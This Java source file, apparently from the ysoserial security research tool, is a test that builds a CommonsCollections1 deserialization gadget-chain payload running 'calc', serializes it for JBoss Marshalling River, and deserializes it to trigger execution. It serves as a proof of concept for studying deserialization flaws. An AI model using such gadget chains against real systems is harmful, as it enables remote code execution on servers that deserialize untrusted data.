package ysoserial;

import org.jboss.marshalling.*;
import ysoserial.Serializer;
import ysoserial.payloads.CommonsCollections1;

import java.io.*;

import static ysoserial.GeneratePayload.INTERNAL_ERROR_CODE;

public class RiverDeserializationTest {

    public static void main(String[] args)  throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        try {
            // Step 1: Create the payload object
            Object object = new CommonsCollections1().getObject("calc");


            System.out.println("[..] Serializing for JBOSS River framework");
            Serializer.serializeForRiver(object, bos);

        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }


        MarshallingConfiguration config = new MarshallingConfiguration();
        config.setVersion(3);
        MarshallerFactory factory = Marshalling.getProvidedMarshallerFactory("river");

        // Step 3: Deserialize using RiverUnmarshaller
        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());

        Unmarshaller unmarshaller = factory.createUnmarshaller(config);
        unmarshaller.start(Marshalling.createByteInput(bis));
        System.out.println("[..] Deserializing payload bytes ");
        Object obj = unmarshaller.readObject();
        unmarshaller.finish();

        System.out.println("[+] Successfully deserialized object: " + obj.getClass());
    }
}
